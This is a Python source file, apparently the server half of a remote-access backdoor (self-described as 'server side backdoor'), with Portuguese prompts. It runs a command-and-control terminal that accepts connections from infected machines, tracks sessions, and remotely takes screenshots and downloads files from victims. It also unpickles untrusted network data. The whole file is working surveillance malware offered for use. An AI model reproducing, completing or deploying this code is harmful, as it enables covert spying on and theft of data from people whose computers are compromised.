# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from threading import Thread
from getpass import getuser
from pickle import loads
from pathlib import Path
from rich import print as printr
from os import system, uname

class Server(object):
    """ server side backdoor """
    def __init__(self, host='0.0.0.0', port=1234):
        self.__Address = (host, port)
        self.connectedUsers = {}
        self.userAttached = ''
        
    def __repr__(self):
        print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')

    def attach(self, name):
        if name:
            if self.connectedUsers.get(name[0]):
                self.userAttached = name[0]
                printr(f'[green] Você está em uma sessão com {name[0]} agora!')
            else:
                printr(f'[red] Não há sessão ativa com [yellow]{name[0]}[red] no momento.')
        else:
            printr('Info: Abre a sessão ativa interagindo com um usuário. Ex: /attach zNairy-PC')

    def detach(self, name):
        if self.userAttached:
            self.userAttached = ''
        else:
            printr(f'[red] Você não está interagindo com nenhuma seção no momento.')

    def checkFolders(self):
        for folder in ['./screenshots','files']:
            if not Path(folder).is_dir():
                Path(folder).mkdir()

    def saveReceivedFile(self, path, content):
        with open(path, 'wb') as receivedFile:
            receivedFile.write(content)

    def receiveFile(self, connection, header):
        received = b''
        while len(received) < header['bytes']:
            received += connection.recv(header['bytes'])
        
        self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', received)

    def download(self, args):
        self.checkFolders()

        if self.userAttached:
            if args:
                connection = self.connectedUsers[self.userAttached]['conn']
                connection.send(self.lastCommand.encode())
                header = loads(connection.recv(512))
                if header["exists"]:
                    self.receiveFile(connection, header)
                else:
                    printr('[red] Arquivo não encontrado...')
            else:
                printr('Info: Faz download de um arquivo externo. Ex: /download sóastop.mp3')
        else:
            printr('[yellow] Não há nenhuma seção aberta no momento...')

    def screenshot(self, args):
        self.checkFolders()

        if self.userAttached:
            connection = self.connectedUsers[self.userAttached]['conn']
            connection.send('/screenshot'.encode())
            header = loads(connection.recv(512))
            self.receiveFile(connection, header)

        else:
            printr('[yellow] Não há nenhuma seção aberta no momento...')

    def addUser(self, data):
        self.connectedUsers.update({data['name']: data})

    def removeUser(self, name):
        if name:
            if self.connectedUsers.get(name[0]):
                if self.userAttached:
                    self.detach(self.userAttached)
                self.connectedUsers.pop(name[0])
                printr(f'[green] Sessão com [yellow]{name[0]} [green]removida!')
            else:
                printr(f'[red] Não há sessão ativa com [yellow]{name[0]}[red] no momento.')
        else:
            print('Info: Remove uma sessão ativa com um usuário. Ex: /rmsession zNairy-PC')

    def clearScreen(self, args):
        system('clear' if uname().sysname.lower() == 'linux' else 'cls')
    
    def showSessions(self, args):
        if self.connectedUsers:
            print(''.join(f'  -{name}\n' for name in self.connectedUsers.keys()))
        else:
            printr('[yellow] Não há nenhuma seção aberta no momento...')

    def showVersion(self, args):
        printr(__version__)
    
    def showContact(self, args):
        printr(__contact__)

    def showCodeAuthor(self, args):
        printr(__author__)

    def closeTerminal(self, args):
        exit()

    def availableCommands(self, args):
        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() ))

    def showLastCommand(self, args):
        printr(self.lastCommand)
    
    def internalcommands(self, args):
        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))

    def allCommands(self):
        commands = {
            "/attach": {"local": True, "action": self.attach},
            "/detach": {"local": True, "action": self.detach},
            "/sessions": {"local": True, "action": self.showSessions},
            "/rmsession": {"local": True, "action": self.removeUser},
            "/screenshot": {"local": False, "action": self.screenshot},
            "/download": {"local": False, "action": self.download},
            "/author": {"local": True, "action": self.showCodeAuthor},
            "/contact": {"local": True, "action": self.showContact},
            "/version": {"local": True, "action": self.showVersion},
            "/lastcommand": {"local": True, "action": self.showLastCommand},
            "/internalcommands": {"local": True, "action": self.internalcommands},
            "/clear": {"local": True, "action": self.clearScreen},
            "/exit": {"local": True, "action": self.closeTerminal}
        }

        commands.update({"/commands": {"local": True, "action": self.availableCommands}})

        return commands

    def splitCommand(self, command):
        if self.allCommands().get(command[0]):
            return self.allCommands()[command[0]], command[1:]

        return False, command[1:]

    def checkCommand(self, command):
        self.lastCommand = command

        command, args = self.splitCommand(command.split())
        if command:
            command['action'](args)
        else:
            printr('[red] Esse comando não existe...') # manda pro lado client checar #

    def sendCommand(self, command):
        self.__Server.send(command.encode('utf-8'))

    def startTerminal(self):
        try:
            while True:
                printr(f'[green]{getuser()}'+ '[white]@' +'[green]sonaris[white]#: ', end='')
                command = input().strip()
                if command and command.startswith('/'):
                    self.checkCommand(command)

        except KeyboardInterrupt:
            print()
            exit()

    def startProcess(self, function, arg=()):
        thread = Thread(target=function)
        thread.daemon = True
        thread.start()

    def listenConnections(self):
        while True:
            connection, address = self.__Server.accept()
            response = loads(connection.recv(1024))
            response.update({"conn": connection})
            self.addUser(response)
            printr(f'\n[*] Incoming connection from [green]{response["name"]}:{response["SO"]}')
            printr(f'[green]{getuser()}'+ '[white]@' +'[green]sonaris[white]#: ', end='')

    def configureSocket(self):
        self.__Server = socket(AF_INET, SOCK_STREAM)
        self.__Server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.__Server.bind(self.__Address)
        self.__Server.listen(1)

    def info(self):
        return f' Servidor aberto em {self.__Address[0]}:{self.__Address[1]}'

    def run(self):
        try:
            self.configureSocket()
        except Exception as err:
            print(err)
            exit(1)
        finally:
            printr(self.info())
            self.startProcess(self.listenConnections)
            self.startTerminal()
